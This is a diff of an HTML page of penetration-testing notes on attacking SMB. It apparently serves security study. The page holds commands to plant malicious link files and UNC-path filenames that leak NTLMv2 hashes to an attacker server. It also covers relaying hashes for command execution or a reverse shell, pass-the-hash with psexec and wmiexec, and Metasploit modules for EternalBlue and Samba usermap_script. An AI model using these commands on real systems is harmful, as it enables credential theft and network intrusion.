@@ -141,14 +141,10 @@ get filename #To download a specific file
 
             <h2>Explotation</h2>
             <ul>
-                <h3>Samba "username map script" Command Execution</h3>
+                <h3>Capturing NTLMv2 hashes</h3>
                 <ul>
-                    <p> Samba version 3.0.20 it explotable using the following</p>
-                    <pre><code class="language-bash">use exploit/multi/samba/usermap_script </code></pre>
-                </ul>    
-            
-                <h3>Generating a malicious link file</h3>
-                <ul>
+                    <h4>Generating a malicious link file</h4>
+                    <ul>
                     <p>We could be able to generate a malicious link file that when clicked will perform a connection to a malicious server we control. Leading to a NTLMv2 hash disclosure</p>
                     <pre><code class="language-bash">netexec smb 172.16.139.3 -u username -p password -M slinky -o NAME=document SERVER=172.16.139.35 SHARE=Print_queue</code></pre>
                     <p>Now use responder or any other tool in order to capture the NTLMv2 hash</p>
@@ -159,35 +155,38 @@ Command=2
 IconFile=\\172.16.139.35\share\icon.ico
 [Taskbar]
 Command=ToggleDesktop</code></pre>
-                    
+                    </ul>
 
+                    <h4>Capturing via UNC SMB request</h4>
+                    <ul>
+                        <p>Having in mind that using the //IP/SHARE syntax can lead to NTLMv2 hash capture. We can try it in different fields. For example uploading a file to a website we can intercept the request and modify the filename to</p>
+                        <pre><code class="language-bash">Content-Disposition: form-data; name="myFile"; filename="//192.168.45.225/document.scf"</code></pre>
+                        <b>Atttempt to try both // and \\</b>
+                        <p>Thtat way with responder listening we will be able to capture the NTLMv2 hash</p>
+                    </ul>
+
+                    <h4>CVE-2025-24071</h4>
+                    <ul>
+                        <p>Summary: Generates a compressed file which when decompressed will perform a connection to responder, leaking NTLMv2 hash <a class="notion-link" href="https://github.com/0x6rss/CVE-2025-24071_PoC">CVE-2025-24071</a></p>
+                    </ul> 
                 </ul>
 
-                <h3>Interaction with the user - exploits</h3>
+                <h3>Relaying NTLMV2 hashes</h3>
                 <ul>
-                    <a class="notion-link" href="https://github.com/0x6rss/CVE-2025-24071_PoC">CVE-2025-24071</a>
+                    <h4>Smbrelay</h4>
+                        <ul>
+                            <p>In case you captured a NTLMv2 hash and you are not able to crack it. You should try to relay the authentication to another server.</p>    
+                            <p>This way you'll be able to authenticate to the server in case you are allowed and dump SAM hashses</p>
+                            <pre><code class="language-bash">impacket-ntlmrelayx --no-http-server -smb2support -t TARGET_SERVER_TO_AUTHENTICATE</code></pre>
+                            <p>We can also create a reverse shell</p>
+                            <pre><code class="language-bash">impacket-ntlmrelayx --no-http-server -smb2support -t TARGET_SERVER_TO_AUTHENTICATE -c 'command'</code></pre>
+                        </ul>
                 </ul>
-
-                <h3>Smbrelay</h3>
+                
+                <h3>Abusing admin rights</h3>
                 <ul>
-                    <p>In case you captured a NTLMv2 hash and you are not able to crack it. You should try to relay the authentication to another server.</p>    
-                    <p>This way you'll be able to authenticate to the server in case you are allowed and dump SAM hashses</p>
-                    <pre><code class="language-bash">impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code></pre>
-                    <p>We can also create a reverse shell</p>
-                    <pre><code class="language-bash">impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'command'</code></pre>
-                    
-                </ul>
-
-                <h3>EternalBlue</h3>
-                <ul>
-                    <p>SMB1 is vulnerable to a common vulnerability called Eternal Blue this one allows to inject code in SMB and spawn a shell as NT Authority\Systen</p>
-                    <p>This vuln affects <b>WS 2008 to WS 2016 Remeber to try different exploits</b></p>
-                    <p>Use the following metasploit module</p>
-                    <pre><code class="language-bash">windows/smb/ms17_010_eternalblue</code></pre>
-                </ul>
-
-                <h3>Getting a shell through smb</h3>
-                <ul>
+                    <h4>Getting a shell through smb</h4>
+                    <ul>
                     <p>In case we have shell access to the remote computer and it is a Windows we could get a reverse shell through meterpreter using the following modules</p>
                     <pre><code class="language-bash">use exploit/windows/smb/smb_delivery</code></pre>
                     <p>srvhost and lhost the same and type exploit</p>
@@ -195,15 +194,39 @@ Command=ToggleDesktop</code></pre>
 set lhost 10.10.14.124
 </code></pre>
                     <p>Then it will give you a command which will performa connection to our SMB server and execute a malicious dll which will make us gain a shell</p>
-                </ul>
+                    </ul>
 
-                <h3>Path traversal (Situationship)</h3>
+                <h4>Psexec using admin credentials</h4>
                 <ul>
-                    <p>In case you found anywhere paths inside the SMB share that you cant no access since you cant list files there is a solution to access</p>
-                    <p>The share may be wrong configured and will lead you access using a simple cd command and specifying the path</p>
+                    <p>In case you have admin credentials of a computer you may be able to use the following metasploit module which grants access to the server</p>
+                    <pre><code class="language-bash">exploit/windows/smb/psexec</code></pre>
+                    <p>You can always perform it manually</p>
+                    <pre><code class="language-bash"></code>impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212</code></pre>
+                    <p>Or wmicexe for the same purpose</p>
+                    <pre><code class="language-bash"></code>impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212</code></pre>
+                </ul>
                 </ul>
 
-                <h3 id="ADS">Alternate Data Streams (ADS)</h3>
+                <h3>Exploits RCE</h3>
+                <ul>
+                    <h4>Samba "username map script" Command Execution</h4>
+                        <ul>
+                            <p> Samba version 3.0.20 it explotable using the following</p>
+                            <pre><code class="language-bash">use exploit/multi/samba/usermap_script </code></pre>
+                        </ul>
+                    
+                    <h4>EternalBlue MS17-010 </h4> 
+                    <ul>
+                        <p>SMB1 is vulnerable to a common vulnerability called Eternal Blue this one allows to inject code in SMB and spawn a shell as NT Authority\Systen</p>
+                        <p>This vuln affects WS 2008 to WS 2016 Remeber to try different exploits</p>
+                        <p>Use the following metasploit module</p>
+                        <pre><code class="language-bash">use exploit/windows/smb/ms17_010_eternalblue</code></pre>  
+                    </ul>
+                </ul>
+
+                <h3>Using built-in functionallities</h3>
+                <ul>
+                    <h4 id="ADS">Alternate Data Streams (ADS)</h4>
                 <ul>
                     <p>In case you find a file which seems suspicious and does not have any content it is possible that content is located in another data stream</p>
                     <p>Basically data streams are like branchs inside a file which let you store data. To view its content inside smb you can use the command <b>allinfo</b> over a file to view its contents</p>
@@ -218,12 +241,23 @@ stream: [::$DATA], 0 bytes
 stream: [:Password:$DATA], 15 bytes</code></pre>
                    <p>As you can see there is a data stream called <b>Password</b> we can view its content using the command <b>more</b> over the file</p>
                 </ul>
-
-                <h3>Psexec using admin credentials</h3>
-                <ul>
-                    <p>In case you have admin credentials of a computer you may be able to use the following metasploit module which grants access to the server</p>
-                    <pre><code class="language-bash">exploit/windows/smb/psexec</code></pre>
+                    
+                    <h4>Path traversal (Situationship)</h4>
+                    <ul>
+                        <p>In case you found anywhere paths inside the SMB share that you cant no access since you cant list files there is a solution to access</p>
+                        <p>The share may be wrong configured and will lead you access using a simple cd command and specifying the path</p>
+                    </ul>
                 </ul>
+                
+
+
+                
+
+                
+
+                
+
+                
 
                 
             </ul>
